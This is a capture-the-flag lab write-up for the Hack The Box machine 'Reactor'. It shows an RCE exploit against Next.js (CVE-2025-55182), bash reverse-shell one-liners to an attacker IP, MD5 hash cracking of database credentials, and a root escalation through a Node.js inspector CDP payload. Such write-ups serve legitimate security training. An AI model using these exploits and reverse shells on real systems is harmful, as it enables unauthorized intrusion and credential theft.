# Hack The Box: Reactor

### Challenge Name: Reactor
**Difficulty:** Easy

<img width="711" height="224" alt="image" src="https://github.com/user-attachments/assets/ce860b70-432e-4325-b719-716614affaf6" />

---

## Writeup

### Enumeration

To start, I ran nmap on the target IP to identify open ports and services:

```bash
nmap -sV 10.129.14.149
```

<img width="800" height="320" alt="image" src="https://github.com/user-attachments/assets/de3b41d5-0b2d-4b7b-a87e-1a9d56009b4e" />

The scan revealed two open ports — SSH on port 22 and an unknown service on port 3000. After investigating port 3000 further, I confirmed it was hosting a web server.

Visiting the site in a browser revealed a nuclear reactor monitoring dashboard called **ReactorWatch**. The page was entirely static with no login forms, input boxes, or obvious attack surface at first glance.

<img width="1922" height="1019" alt="image" src="https://github.com/user-attachments/assets/e9b37e86-c4bd-4d1a-95ce-f5772a8d47d1" />

I used **Wappalyzer** to fingerprint the technology stack and identified the framework as **Next.js 15.0.3**.

<img width="572" height="564" alt="image" src="https://github.com/user-attachments/assets/a12d4f0f-6687-40db-bbd5-35db71091493" />

---

### Initial Foothold — CVE-2025-55182 (RCE)

Next.js 15.0.3 is vulnerable to **CVE-2025-55182**, a critical unauthenticated Remote Code Execution vulnerability affecting React Server Components. The vulnerability works by sending a malicious multipart form payload to the server that exploits unsafe deserialization in React's Flight protocol via prototype pollution, ultimately allowing arbitrary command execution.

I used the following exploit from GitHub:
`https://github.com/cybertechajju/R2C-CVE-2025-55182-66478`

Using the bash exploitation script, I triggered a reverse shell:

```bash
bash exploits/scanner_advanced.sh -d http://10.129.14.149:3000/ -c "bash -c 'bash -i >& /dev/tcp/10.10.14.165/4444 0>&1'"
```

<img width="990" height="689" alt="image" src="https://github.com/user-attachments/assets/90f4456e-4791-4a8d-be33-d5ff2238d86d" />

<img width="702" height="451" alt="image" src="https://github.com/user-attachments/assets/d101f476-979f-4617-92e0-3fb5b0666444" />

This gave me a shell as the `node` user.

---

### Getting User

From `/etc/passwd` I identified a user account called `engineer`. I needed to find their password.

Looking around the application directory at `/opt/reactor-app`, I noticed a file called `reactor.db` — a SQLite database. I queried it and pulled out some user account data:

```bash
sqlite3 reactor.db "SELECT * FROM users;"
```

```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

The passwords were stored as unsalted MD5 hashes. I saved them to a file and cracked them using John the Ripper with the rockyou wordlist:

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="860" height="212" alt="image" src="https://github.com/user-attachments/assets/fc8ffae5-d956-4e00-8c7c-35662b1c0b6b" />

The engineer hash cracked to `reactor1`. I used this to SSH in as engineer and grabbed the user flag.

<img width="650" height="437" alt="image" src="https://github.com/user-attachments/assets/ab1a66d0-090b-42e6-b857-4645abf2fe92" />

---

### Privilege Escalation — Node.js Inspector RCE

I uploaded and ran **linpeas.sh** to enumerate privilege escalation vectors. One finding stood out immediately in the process list:

```
root 1419 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

There are a few things that make this interesting:

1. The `--inspect` flag enables the **Node.js debugger protocol**, which opens a WebSocket server that accepts debugging connections and allows arbitrary JavaScript execution
2. The process is running as **root** — meaning any code we execute through the debugger runs with root privileges
3. It is bound to `127.0.0.1:9229` — only accessible locally, so we need to tunnel to it

**The Attack Chain:**

Since the inspector is only listening on localhost, I couldn't connect to it directly from my Kali machine. I used SSH local port forwarding to tunnel the port to my machine:

```
Kali Machine                    Target (reactor)
------------                    ----------------
Terminal 1:
ssh -L 9229:127.0.0.1:9229  →   engineer@10.129.15.152
        ↑
        This creates a tunnel:
        YOUR 127.0.0.1:9229 ←→ TARGET 127.0.0.1:9229

Terminal 2:
nc -lvnp 5555               ←   (waiting for reverse shell)

Terminal 3:
wscat connects to ws://127.0.0.1:9229/UUID
SSH secretly forwards it to the target's Node.js debugger
We send a CDP message → Node.js (root) executes it → reverse shell
```

First I got the WebSocket UUID by querying the inspector endpoint through the tunnel:

```bash
curl -s http://127.0.0.1:9229/json
```

Then I connected using `wscat` and sent a **Chrome DevTools Protocol (CDP)** `Runtime.evaluate` message to execute a reverse shell as root:

```bash
wscat -c ws://127.0.0.1:9229/<UUID>
```

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.165/5555 0>&1\"')"}}
```

<img width="682" height="594" alt="image" src="https://github.com/user-attachments/assets/2cc01dc0-7619-403d-aae8-9897df04e86f" />

My `nc` listener caught the connection and I had a root shell. I grabbed the root flag from `/root/root.txt`.

---

### Summary

| Step | Method |
|------|--------|
| RCE | CVE-2025-55182 — React Server Components prototype pollution |
| User | SQLite database credentials + MD5 hash cracking |
| Root | Node.js Inspector RCE via SSH port forwarding |
